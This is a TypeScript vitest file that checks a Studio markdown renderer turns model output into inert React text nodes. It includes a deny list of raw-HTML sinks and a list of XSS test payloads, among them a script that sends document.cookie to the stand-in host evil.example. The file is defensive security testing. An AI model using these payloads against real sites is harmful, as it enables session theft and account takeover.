import { describe, it, expect } from "vitest";
import * as fs from "fs";
import * as path from "path";
import { parseMarkdown, parseInline, MdBlock, MdNode } from "../markdown";

/**
 * Studio's XSS story is architectural: model output is parsed to a structure
 * (markdown.ts) and rendered as React text nodes, so untrusted text never
 * becomes markup. markdown.ts states the invariant in a comment — these tests
 * are what actually enforce it. The recent webview XSS fixes (extension) were
 * hand-escaped innerHTML; this keeps the Studio side from ever growing that
 * class of bug.
 */

const STUDIO_DIR = path.join(__dirname);

/** Raw-HTML sinks that would bypass React's escaping. */
const FORBIDDEN = [
  "dangerouslySetInnerHTML",
  "innerHTML",
  "insertAdjacentHTML",
  "outerHTML",
  "document.write",
];

function studioSources(): string[] {
  const out: string[] = [];
  const walk = (dir: string) => {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) walk(full);
      else if (/\.(ts|tsx)$/.test(entry.name) && !entry.name.endsWith(".test.ts")) out.push(full);
    }
  };
  walk(STUDIO_DIR);
  out.push(path.join(STUDIO_DIR, "..", "markdown.ts"));
  return out;
}

describe("Studio renders model output as structure, never as markup", () => {
  it("has no raw-HTML sink anywhere in the Studio sources", () => {
    const offenders: string[] = [];
    for (const file of studioSources()) {
      // Comments may name the forbidden thing (markdown.ts documents the
      // invariant); only code occurrences count.
      const src = fs.readFileSync(file, "utf8")
        .replace(/\/\*[\s\S]*?\*\//g, "")
        .replace(/(^|\s)\/\/.*$/gm, "$1");
      for (const sink of FORBIDDEN) {
        if (src.includes(sink)) offenders.push(`${path.relative(STUDIO_DIR, file)}: ${sink}`);
      }
    }
    expect(
      offenders,
      `Raw-HTML sinks found — model-derived strings must reach the DOM as React text nodes:\n  ${offenders.join("\n  ")}`,
    ).toEqual([]);
  });

  const HOSTILE = [
    `<script>alert("xss")</script>`,
    `<img src=x onerror="alert(1)">`,
    `<a href="javascript:alert(1)">click</a>`,
    `<svg onload=alert(1)></svg>`,
    `<iframe src="https://evil.example"></iframe>`,
    `"><script>document.location='https://evil.example/?c='+document.cookie</script>`,
    `<div onmouseover="alert(1)">hover</div>`,
    `<body onload=alert(1)>`,
    "`` `<script>` `` inline code payload",
    "```\n<script>alert('in fence')</script>\n```",
    "```<script>alert('as fence lang')</script>\nconst x = 1;\n```",
    "## <script>alert('in heading')</script>",
    "- <img src=x onerror=alert(1)>",
    "**<script>alert('in strong')</script>**",
  ];

  it("every hostile payload parses to known node kinds with the payload as plain data", () => {
    for (const payload of HOSTILE) {
      const blocks = parseMarkdown(payload);
      assertStructure(blocks, payload);
      // And the inline parser on its own.
      for (const node of parseInline(payload)) assertTextNode(node);
    }
  });

  it("a payload spread across a streaming partial render stays inert", () => {
    // Studio re-parses on every delta; each prefix of a hostile message must
    // be as inert as the whole.
    const payload = `# heading\n\ntext with <script>alert(1)</script> and \`<img src=x onerror=alert(1)>\`\n\n\`\`\`ts\n// <svg onload=alert(1)>\n\`\`\``;
    for (let i = 1; i <= payload.length; i += 7) {
      assertStructure(parseMarkdown(payload.slice(0, i)), `prefix at ${i}`);
    }
  });
});

const KNOWN_BLOCKS = new Set(["paragraph", "heading", "list", "fence"]);
const KNOWN_NODES = new Set(["text", "code", "strong"]);

function assertStructure(blocks: MdBlock[], what: string): void {
  for (const block of blocks) {
    if (!KNOWN_BLOCKS.has(block.kind)) throw new Error(`${what}: unknown block kind ${block.kind}`);
    if (block.kind === "paragraph" || block.kind === "heading") {
      for (const node of block.nodes) assertTextNode(node);
    } else if (block.kind === "list") {
      for (const item of block.items) for (const node of item) assertTextNode(node);
    } else if (block.kind === "fence") {
      // lang and path are rendered as badge labels; anything the model puts
      // there stays a plain string.
      expect(typeof block.lang).toBe("string");
      expect(typeof block.path).toBe("string");
    }
  }
}

function assertTextNode(node: MdNode): void {
  if (!KNOWN_NODES.has(node.kind)) throw new Error(`unknown node kind ${node.kind}`);
  expect(typeof node.text).toBe("string");
}
